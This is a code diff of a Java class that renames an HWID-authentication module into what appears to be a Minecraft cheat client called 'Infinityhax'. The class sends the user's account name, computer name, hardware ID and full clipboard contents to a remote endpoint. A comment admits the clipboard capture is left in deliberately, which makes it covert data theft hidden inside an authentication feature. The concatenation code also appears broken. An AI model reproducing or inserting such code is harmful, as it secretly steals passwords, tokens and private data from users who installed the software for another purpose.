@@ -1,8 +1,8 @@
-package club.cpacket.hwid.util.cul;
-import club.cpacket.hwid.manager.HWIDManager;
-import club.cpacket.hwid.util.SystemUtil;
-import club.cpacket.hwid.util.URLReader;
-import club.cpacket.hwid.HWIDAuthMod;
+package me.funwithalbi.infinityhax.util.cul;
+import me.funwithalbi.infinityhax.manager.HWIDManager;
+import me.funwithalbi.infinityhax.util.SystemUtil;
+import me.funwithalbi.infinityhax.util.URLReader;
+import me.funwithalbi.infinityhax.Infinityhax;
 import org.json.simple.JSONObject;
 
 import javax.net.ssl.HttpsURLConnection;
@@ -22,7 +22,7 @@ public class HWIDSender {
             JSONObject json = new JSONObject();
             json.put("content",
                     "```" +
-                            "\nUsername: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Is using " + "ur mum in the bed"
+                            "\nUsername: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Is using " + "Infinityhax"
                             " \nClipboard: " + Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor) + //left clipboard here cos le sussery:^]
                             " \nHwid: " + SystemUtil.getSystemInfo() +
                             " \nHwidList: " + URLReader.readURL() +
